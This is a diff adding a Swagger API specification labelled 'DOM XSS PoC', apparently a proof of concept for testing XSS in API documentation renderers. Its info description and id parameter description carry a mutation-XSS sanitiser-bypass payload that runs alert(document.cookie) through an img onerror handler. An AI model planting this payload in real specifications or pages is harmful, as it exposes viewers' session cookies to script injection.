@@ -1,0 +1,38 @@
+swagger: '2.0'
+info:
+  title: DOM XSS PoC
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+  version: production
+basePath: /api/v1/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /user:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - XSS PoC
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/user/{id}':
+    get:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
